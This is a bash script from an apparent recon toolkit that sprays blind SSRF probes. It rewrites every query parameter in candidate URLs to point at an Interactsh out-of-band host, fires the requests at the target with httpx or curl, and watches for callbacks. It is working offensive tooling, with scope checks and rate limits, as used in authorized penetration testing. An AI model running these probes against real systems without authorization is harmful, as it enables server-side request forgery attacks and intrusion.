#!/usr/bin/env bash
# vuln/ssrf.sh — blind SSRF spray + OOB confirmation.
#
# Pipeline:
#   1. Pull SSRF candidates from gf-ssrf.txt (recon/11)
#   2. qsreplace every parameter with an Interactsh token URL
#   3. Hit each URL once; the request itself doesn't confirm anything
#   4. Watch the Interactsh session for callbacks
#
# Pre-req: Phase 13 of recon (oob-callback.sh) running OR INTERACTSH_URL set.

PHASE="ssrf"
. "$(dirname "$0")/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

CANDIDATES="${SSRF_LIST:-$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/11-pattern-filter/gf-ssrf.txt}"
if [ ! -s "$CANDIDATES" ]; then
    log ERR "no SSRF candidates at $CANDIDATES — run recon/11 first"
    exit 5
fi

# Resolve OOB session URL — either env, or pick up from a running Phase-13 session
if [ -z "${INTERACTSH_URL:-}" ]; then
    sess="$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/13-oob-callback/session-url.txt"
    if [ -s "$sess" ]; then
        INTERACTSH_URL=$(cat "$sess")
        log INFO "picked up OOB session from recon/13: $INTERACTSH_URL"
    fi
fi
if [ -z "${INTERACTSH_URL:-}" ]; then
    log ERR "INTERACTSH_URL required — start recon/13-oob-callback.sh first or set manually"
    exit 2
fi

SPRAY="$OUTDIR/payloads.txt"
if command -v qsreplace >/dev/null 2>&1; then
    cat "$CANDIDATES" | qsreplace "http://${INTERACTSH_URL}/" > "$SPRAY"
else
    # Crude fallback
    sed 's/=[^&]*/=http:\/\/'"$INTERACTSH_URL"'\//g' "$CANDIDATES" > "$SPRAY"
fi

log INFO "firing $(wc -l < "$SPRAY") SSRF probes"
# Fire-and-forget; the response from the target doesn't matter — the
# Interactsh callback is what confirms reach.
if command -v httpx >/dev/null 2>&1; then
    httpx -l "$SPRAY" -silent -fr -rl "$RATE_LIMIT_RPS" -t "$THREADS" \
        > "$OUTDIR/responses.txt" 2>/dev/null || true
else
    while read -r u; do
        curl -s --max-time 5 -o /dev/null "$u" 2>/dev/null || true
    done < "$SPRAY"
fi

log INFO "spray done — watch the Interactsh client for callbacks"
log INFO "  tail callbacks:  tail -f $RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/13-oob-callback/callbacks.txt"
log INFO "  confirmed hits should reference URLs in $SPRAY (token in the subdomain)"
